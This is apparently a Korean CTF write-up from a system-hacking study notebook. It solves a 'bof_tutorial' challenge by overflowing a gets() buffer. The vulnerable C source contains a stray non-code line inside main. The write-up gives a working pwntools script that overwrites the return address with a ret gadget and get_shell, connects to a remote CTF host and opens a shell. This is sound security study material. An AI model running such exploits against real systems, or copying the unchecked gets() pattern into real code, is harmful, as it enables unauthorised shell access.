# bof_tutorial

> ### 소스코드를 분석하여 buffer overflow 방식으로 get_shell() 함수를 실행시켜 플래그를 얻어낼 수 있다. 


<hr>

# Solution 

- source code
```c
#include <stdio.h>
#include <stdlib.h>
void init( void )
{
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);
}
void get_shell( void )
{
	system( "/bin/sh" );
}
int main( void )
{
	char buf[16];
	init();
	gets( buf );
	printf( "Your input is %s\n", buf );
	bof_tutorial guide 2
	return 0;
}
```
### 코드 분석

- 위의 소스 코드를 보면 `get_shell` 함수를 실행시키면 플래그를 얻을 수 있을 것 같은데 main 함수에는 `get_shell`함수를 실행하는 코드가 없다.
- 그리고 main 함수에는 입력을 받는 길이를 확인하지 않는 취약점을 가진 함수인 `gets` 함수가 있다.
- 스택 구조의 가장 밑(높은 주소)에있는 RET 영역은 다음에 실행할 명령어의 주소를 담고있다.
- 이 부분을 `get_shell` 함수의 주소로 덮으면 될 것 같다.
- 이 프로그램을 실행할 때 스택의 구조는 아래와 같다.
![스크린샷 2024-01-19 200142](https://github.com/yeochaeeon/23SystemHacking_study/assets/129289883/fa55ba9a-2619-41a5-b138-c64a14fc6c41){: width="60%" height="60%"}
- `gets()` 함수로 입력을 받을 때 쓰레기 값으로 (16+8) byte를 채우고 그 뒤에 `get_shell` 함수의 주소를 입력하자.
- `info func`  명령어를 사용하면 함수들의 정보를 확인 할 수 있다.
- 이를 통해 `get_shell` 함수의 주소가 `0x00000000004011b7` 임을 알 수 있다.
- 이제 위에서 알아낸 정보들을 바탕으로  exploit 코드를 작성하면 된다.
```python
# bof_exploit.py
from pwn import *
# process를 실행하기 위한 함수
# remote로 접속하려면 remote 함수를 사용해야함
r = remote( "ctf.keeper.or.kr", 1010 )
payload = b"A" * 24 # buf( 16 bytes ) + SFP( 8 bytes )
payload += p64( 0x40101a ) # system 함수 내부 구현 때문에 ret gad
payload += p64( 0x4011b7 ) # get_shell
# payload를 입력하기 위한 함수. 
# 끝에 '\n'까지 붙여주는 기능을 갖고 있음.
r.sendline( payload )
# shell을 획득하고 나서 직접적인 상호작용을 위한 함수
r.interactive()
```

### 코드 실행 결과
![스크린샷 2024-01-19 190946](https://github.com/yeochaeeon/23SystemHacking_study/assets/129289883/5c224b8e-46dc-434d-91c7-d2421a999990)

